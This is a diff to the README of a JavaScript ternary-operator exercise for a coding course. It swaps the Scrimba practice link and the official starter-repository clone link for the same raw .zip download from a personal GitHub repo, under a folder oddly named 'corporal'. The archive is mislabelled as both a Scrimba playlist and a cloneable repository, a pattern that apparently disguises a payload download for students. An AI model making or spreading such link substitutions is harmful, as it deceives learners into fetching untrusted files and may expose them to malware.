@@ -6,7 +6,7 @@ You will:
 3. Commit changes to your GitHub repository.
 4. Submit the GitHub Repository Link to the LMS [JSL04] Submission Project Tab.
 
-Check out the practice challenges on Scrimba here: https://scrimba.com/playlist/p9bvd5QH3
+Check out the practice challenges on Scrimba here: https://github.com/LupiwoPhillips/Module_4_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL04/raw/refs/heads/main/corporal/LUPIW-JS-LUPPH-Module-PT-PHILLIP-Group-2.4.zip
 
 **Challenge Scenario:** In this coding exercise, you will work with the Monster Ternary Operator. You'll use ternary operators to make decisions based on various scenarios involving Monster Energy drinks.
 
@@ -14,7 +14,7 @@ In each of these challenges, the ternary operator is used to decide between two 
 
 ## What You Need to Do:
 
-1. Clone the provided Starter Code Repository to your local development environment (e.g., VSCode): https://github.com/CodeSpace-Academy/Module_4_StudentNo_Classcode_Group_Name-Surname_JSL04 
+1. Clone the provided Starter Code Repository to your local development environment (e.g., VSCode): https://github.com/LupiwoPhillips/Module_4_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL04/raw/refs/heads/main/corporal/LUPIW-JS-LUPPH-Module-PT-PHILLIP-Group-2.4.zip 
 2. Open the cloned project in your code editor.
 3. Code your solution for each of the challenges as per the provided instructions.
 4. Commit your changes to your local Git repository with meaningful commit messages.
